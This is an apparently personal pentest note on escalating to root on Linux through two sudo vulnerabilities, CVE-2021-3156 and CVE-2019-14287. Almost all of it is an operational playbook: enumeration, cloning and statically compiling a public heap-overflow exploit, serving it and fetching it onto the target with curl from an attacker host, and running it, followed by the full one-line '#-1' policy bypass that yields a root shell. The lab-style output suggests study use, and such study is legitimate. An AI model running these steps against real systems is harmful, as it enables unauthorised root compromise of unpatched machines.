---
Primary_category: "[[LINUX PRIVESC]]"
title: "SUDO ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *CVE-2021-3156*

> ***Sudo Heap Overflow***

> ***[CVE-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156)***

> ***Affected Sudo Versions → 1.9.5p1 and lower***

##### *Enumeration*

###### *Sudo Version*

```bash
sudo -V | head -n1
```

###### *OS*

```bash
hostnamectl
cat /etc/issue
lsb_release -a
cat /etc/os-release
```

##### *Abuse*

###### *Cloning the Github Repository*

> ***[Github PoC](https://github.com/blasty/CVE-2021-3156)***

> ***From the Attacker*** ⚔️

```bash
git clone https://github.com/blasty/CVE-2021-3156.git CVE-2021-3156.git
```

###### *Compiling the Binary*

From here, we can verify if the target has *make* and *gcc* installed and available. If so, we can transfer the *github* repository or the required files through *RSYNC* if we have *SSH* access to the target

> ***From the Target*** 🎯

```bash
mkdir /dev/shm/CVE-2021-3156
```

> ***From the Attacker*** ⚔️

```bash
cd !$ && rsync --progress -AXavz . <USER>@<TARGET>:/dev/shm/CVE-2021-3156/
```

> ***From the Target***

```bash
cd /dev/shm/CVE-2021-3156 && make
```

If those tools are not available on the target, we will have to perform an static linking during the binary compilation to ensure maxium portability and transfer the static binary to the target to execute it

> ***From the Attacker*** ⚔️

Just edit the *Makefile* and add the **`-static`** option to the *gcc* command which creates the static binary

The command should look like this

```bash
gcc -static -std=c99 -o sudo-hax-me-a-sandwich hax.c
```

Then, we run **`make`** and transfer the binary to the target

> ***From the Attacker*** ⚔️

```bash
make
```

###### *Transferring the static binary to the target*

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
curl --silent --location --request GET 'http://<ATTACKER_IP>/sudo-hax-me-a-sandwich' --output sudo_exploit
```

```bash
chmod 700 !$
```

###### *Running the Exploit*

Based on the *sudo version* and the target *OS*, we must select one of the available options

```bash
./sudo_exploit <OPTION> # e.g. ./sudo_exploit 0
```

---

#### *CVE-2019-14287*

> ***Sudo Policy Bypass***

> ***[CVE-2019-14287](https://nvd.nist.gov/vuln/detail/cve-2019-14287)***

> ***Affected Sudo Versions → 1.8.27 and lower***

##### *Requirements*

- ***The current user must have any sudo privileges i.e. run any command as any user***

> ***This results in an entry in the `/etc/sudoers` file***

##### *Enumeration*

###### *Sudo Privileges*

Simply check the current user *sudo* privileges by issuing the following command

```bash
sudo -l
```

> [!NOTE]- *Command Output*
>
> ```bash
> [sudo] password for 4l3xbb: 
> Matching Defaults entries for htb-student on ubuntu:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
> 
> User 4l3xbb may run the following commands on ubuntu:
>     (ALL, !root) /bin/ncdu
> ```
>

We see that we can run **`/bin/ncdu`** as any user except *ROOT*

###### *Sudo Version*

Nevertheless, we can check the target's *sudo* version. Bear in mind that if its version is lower than the *1.8.27*, we can pwn the system by running the given command as *ROOT*, even though it is explicitly forbidden

```bash
sudo -V | head -n1
```

> [!NOTE]- *Command Output*
>
> ```bash
> Sudo version 1.8.21p2 
> ```
>

And it is!

##### *Abuse*

Therefore, run the following command →

```bash
sudo -u '#-1' -- /bin/ncdu
```

Once we are inside the **`ncdu`** interface, simply press *b* and a shell will spawn as *root*